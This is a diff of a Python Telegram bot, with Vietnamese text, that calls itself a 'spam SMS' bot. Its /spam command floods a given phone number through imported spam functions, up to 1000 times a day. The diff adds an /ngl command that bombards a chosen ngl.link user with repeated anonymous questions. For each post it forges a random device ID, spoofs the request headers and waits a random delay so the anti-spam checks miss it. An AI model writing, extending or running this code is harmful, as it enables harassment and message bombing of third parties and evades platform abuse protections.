@@ -3,35 +3,39 @@ import asyncio
 import datetime
 import concurrent.futures
 import logging
+import random
+import urllib.parse
 from collections import defaultdict
+
+import httpx
 from telegram import Update, Chat, BotCommand
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
+from telegram.ext import (
+    ApplicationBuilder, CommandHandler, ContextTypes,
+    ConversationHandler, MessageHandler, filters
+)
 
-from spam_sms import *  # Import các hàm spam từ spam_sms.py
-
-# Thiết lập logging
+# === Config ===
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
-logging.getLogger("httpx").setLevel(logging.WARNING)  # Ẩn log httpx Telegram API
+logging.getLogger("httpx").setLevel(logging.WARNING)
 
-# Lấy TOKEN từ biến môi trường
 TOKEN = os.getenv("TOKEN")
 if not TOKEN:
     print("❌ Thiếu biến môi trường TOKEN.")
     exit(1)
 
-# 👑 ID admin
 ADMIN_IDS = [1087968824]
-
-# Giới hạn người dùng
 DAILY_LIMIT = 1000
 user_stop_flags = defaultdict(bool)
 daily_usage = defaultdict(lambda: {'date': str(datetime.date.today()), 'count': 0})
 
+# === NGL handler state ===
+ASK_NGL_USER, ASK_NGL_COUNT, ASK_NGL_QUESTION = range(3)
+ngl_user_data = {}
 
+# === Utility ===
 def is_group_chat(update):
     return update.effective_chat.type in [Chat.GROUP, Chat.SUPERGROUP]
-
 
 def check_daily_limit(user_id, times):
     today = str(datetime.date.today())
@@ -44,14 +48,16 @@ def check_daily_limit(user_id, times):
     user_data['count'] += times
     return True
 
-
 def call_with_log(func, phone):
     try:
-        print(f"📨 Gọi {func.__name__}({phone})")  # ✅ Vẫn hiện tên hàm đang spam
+        print(f"📨 Gọi {func.__name__}({phone})")
         func(phone)
     except Exception as e:
         print(f"❌ Lỗi khi gọi {func.__name__}(): {e}")
 
+# === Spam SMS (từ spam_sms.py) ===
+# Giả lập hàm spam
+from spam_sms import *
 
 async def spam_runner(context, user_id, full_name, phone, times, chat_id):
     SPAM_FUNCTIONS = [
@@ -89,8 +95,70 @@ async def spam_runner(context, user_id, full_name, phone, times, chat_id):
             parse_mode='HTML'
         )
 
+# === Gửi câu hỏi ngl.link ===
+async def send_ngl_questions(chat_id, context, username, question, sl):
+    url = "https://ngl.link/api/submit"
+    for i in range(sl):
+        deviceId = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32))
+        headers = {
+            'accept': '*/*',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'origin': 'https://ngl.link',
+            'referer': f'https://ngl.link/{username}',
+            'x-requested-with': 'XMLHttpRequest'
+        }
+        data = f"username={urllib.parse.quote(username)}&question={urllib.parse.quote(question)}&deviceId={deviceId}&gameSlug=&referrer="
 
-# 📲 /spam
+        try:
+            async with httpx.AsyncClient() as client:
+                res = await client.post(url, data=data, headers=headers, timeout=10)
+                res.raise_for_status()
+                result = res.json()
+                await context.bot.send_message(
+                    chat_id=chat_id,
+                    text=f"✅ Gửi {i + 1}/{sl}: ID {result.get('questionId')} | {result.get('userRegion')}"
+                )
+        except Exception as e:
+            await context.bot.send_message(chat_id=chat_id, text=f"❌ Lỗi gửi lần {i + 1}: {e}")
+
+        await asyncio.sleep(random.uniform(0.5, 2.0))
+
+    await context.bot.send_message(chat_id=chat_id, text=f"🎉 Đã hoàn tất gửi {sl} câu hỏi.")
+
+# === NGL các bước ===
+async def ngl_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("🧑 Nhập username NGL (ví dụ: johndoe):")
+    return ASK_NGL_USER
+
+async def ngl_input_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    chat_id = update.effective_chat.id
+    ngl_user_data[chat_id] = {'username': update.message.text.strip()}
+    await update.message.reply_text("🔢 Nhập số lượng câu hỏi muốn gửi:")
+    return ASK_NGL_COUNT
+
+async def ngl_input_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    chat_id = update.effective_chat.id
+    text = update.message.text.strip()
+    if not text.isdigit():
+        await update.message.reply_text("❌ Vui lòng nhập số.")
+        return ASK_NGL_COUNT
+    ngl_user_data[chat_id]['sl'] = int(text)
+    await update.message.reply_text("💬 Nhập nội dung câu hỏi muốn gửi:")
+    return ASK_NGL_QUESTION
+
+async def ngl_input_question(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    chat_id = update.effective_chat.id
+    ngl_user_data[chat_id]['question'] = update.message.text.strip()
+    data = ngl_user_data.pop(chat_id)
+    await update.message.reply_text("🚀 Đang gửi câu hỏi...")
+    await send_ngl_questions(chat_id, context, data['username'], data['question'], data['sl'])
+    return ConversationHandler.END
+
+async def ngl_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("❌ Đã hủy thao tác gửi NGL.")
+    return ConversationHandler.END
+
+# === Command handlers ===
 async def spam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
@@ -102,7 +170,7 @@ async def spam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if len(context.args) < 1:
-        await update.message.reply_text("❌ Sai cú pháp.\n👉 /spam <số_điện_thoại> <số_lần>")
+        await update.message.reply_text("❌ Sai cú pháp.\n👉 /spam &lt;số_điện_thoại&gt; &lt;số_lần&gt;")
         return
 
     try:
@@ -130,15 +198,11 @@ async def spam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except ValueError:
         await update.message.reply_text("❌ Số lần phải là số nguyên.")
 
-
-# 🛑 /stop
 async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     user_stop_flags[user_id] = True
     await update.message.reply_text("🛑 Bạn đã dừng spam.", parse_mode='HTML')
 
-
-# 📊 /check
 async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     today = str(datetime.date.today())
@@ -154,8 +218,6 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='HTML'
     )
 
-
-# 🌐 /ip
 async def ip_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "🌐 Kiểm tra địa chỉ IP:\n👉 https://mphongdev-net.vercel.app/",
@@ -163,8 +225,6 @@ async def ip_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         disable_web_page_preview=True
     )
 
-
-# 🆔 /id
 async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     await update.message.reply_text(
@@ -172,8 +232,6 @@ async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='HTML'
     )
 
-
-# 🔁 /reset
 async def reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     admin_id = update.effective_user.id
     if int(admin_id) not in ADMIN_IDS:
@@ -192,29 +250,29 @@ async def reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='HTML'
     )
 
-
-# 🚀 /start
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         await update.message.reply_text(
-            "🤖 <b>Bot spam SMS</b>\n"
-            "/spam &lt;số_điện_thoại&gt; &lt;số_lần&gt; — spam SMS\n"
+            "🤖 <b>Bot spam SMS + NGL</b>\n"
+            "/spam &lt;sdt&gt; &lt;số_lần&gt; — spam SMS\n"
+            "/ngl — gửi câu hỏi ẩn danh ngl.link\n"
             "/stop — dừng spam\n"
             "/check — xem lượt spam hôm nay\n"
-            "/reset — (admin) reset lượt user\n"
+            "/reset — reset lượt spam (admin)\n"
             "/ip — kiểm tra IP\n"
             "/id — lấy ID Telegram\n"
+            "/cancel — hủy thao tác đang nhập\n"
             "📅 Giới hạn: 1000 lần/ngày\n"
-            "Bot By VŨ MINH PHONG",
+            "Bot by VŨ MINH PHONG",
             parse_mode='HTML'
         )
     except Exception as e:
         logger.error(f"Lỗi khi gửi lệnh /start: {e}")
 
-
-# ✅ Khởi tạo bot
+# === Khởi tạo bot ===
 def create_bot():
     app = ApplicationBuilder().token(TOKEN).build()
+
     app.add_handler(CommandHandler("start", start_command))
     app.add_handler(CommandHandler("spam", spam_command))
     app.add_handler(CommandHandler("stop", stop_command))
@@ -223,16 +281,29 @@ def create_bot():
     app.add_handler(CommandHandler("reset", reset_command))
     app.add_handler(CommandHandler("id", id_command))
 
-    # ✅ Gợi ý lệnh Telegram (set commands)
+    # Conversation handler cho NGL
+    ngl_conv = ConversationHandler(
+        entry_points=[CommandHandler("ngl", ngl_start)],
+        states={
+            ASK_NGL_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, ngl_input_user)],
+            ASK_NGL_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, ngl_input_count)],
+            ASK_NGL_QUESTION: [MessageHandler(filters.TEXT & ~filters.COMMAND, ngl_input_question)],
+        },
+        fallbacks=[CommandHandler("cancel", ngl_cancel)]
+    )
+    app.add_handler(ngl_conv)
+
     async def set_commands(application):
         await application.bot.set_my_commands([
             BotCommand("start", "Bắt đầu bot"),
             BotCommand("spam", "Spam số điện thoại"),
+            BotCommand("ngl", "Gửi câu hỏi ẩn danh NGL"),
             BotCommand("stop", "Dừng spam"),
             BotCommand("check", "Kiểm tra số lượt hôm nay"),
             BotCommand("ip", "Kiểm tra địa chỉ IP"),
             BotCommand("id", "Lấy ID Telegram"),
             BotCommand("reset", "Reset lượt spam (admin)"),
+            BotCommand("cancel", "Hủy nhập khi gửi NGL")
         ])
 
     app.post_init = set_commands
